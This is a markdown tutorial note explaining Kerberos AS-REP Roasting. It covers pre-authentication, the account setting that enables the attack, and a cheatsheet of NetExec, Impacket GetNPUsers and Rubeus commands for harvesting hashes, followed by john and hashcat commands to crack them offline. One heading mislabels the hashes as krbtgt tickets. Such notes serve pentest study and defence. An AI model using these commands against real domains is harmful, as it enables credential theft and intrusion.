# What is AS_REP Roasting Attack?
- AS-REP Roasting is an attack targeting the Kerberos authentication protocol. It exploits accounts where Kerberos pre-authentication is disabled, allowing attackers to crack passwords offline.
- To understand this attack we need to understand first how kerberos authentication server works.
By default when a domain user tries to authenticate to the kerberos AS (Authentication server), he goes with this flow:
- User starts the flow of granting a TGT [Ticket Granting Ticket] which serves as a proof for requester's identity (TGT can be used later to request TGS - Ticket Granting Service)
- to get a TGT user must pass the kerberos pre-authentication
### Kerbero pre-authentication
1. User sends Authentication Service Request (**AS_REQ**) that includes _principal name_ and _timestamp_ **encrypted** with the users password 
2. Kerberos Auth server verifies the identity of the requester and decrypts the timestamp with the user password hash
3. The KDC replies with **AS_REP** Which contians a **TGT** (encrypted with krbtgt pass hash) hence user can't really see its coontent, and most importantly a Session Key that is encrypted with requestor's password hash.
4. User can use the TGT later to request access to different services without re-authinticating


## the checkbox that allows for this attack ☑️
<img width="405" height="537" alt="image" src="https://github.com/user-attachments/assets/afdf036a-b067-4c3a-bd30-7aaa79ca9999" />

## how to attack works?
1. When a user has `Do not require Kerberos pre-authentication` enabled, this means the pre-authentication step is SKIPPED!, hence we can get to the second step (Getting the AS_REP that contains the Session key)
2. Once we have the session key (encrypted with user's password hash), we can try to Crack it offline with hashcat or john


### attack Cheatsheet
- Netexec: we simply give it the dc ip and the sam usernames and an output file to store the stolen hashes  
```shell
nxc ldap <dc-ip> -u users.txt -p '' --asreproast outfile.txt
```
- Impacket-GetNPUsers
```shell
impacket-GetNPUsers simply.cyber/ -no-pass -usersfile users.txt -dc-ip 10.10.10.128 -outputfile hashes.txt
```
- Rubeus: we need to upload Rubeus.exe to the target first using smbserver/python3 http/ scp/ evil-winrm upload/ and so on..
```shell
.\rubeus.exe asreproast /nowrap /outfile:hash.txt /format:hashcat #/format:john
```

## Cracking AS_REP krbtgt tickets
```shell
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
- Hashcat
```shell
hashcat -m 18200 -a 0 -o cracked_hashes.txt hashes.txt /usr/share/wordlists/rockyou.txt 
```
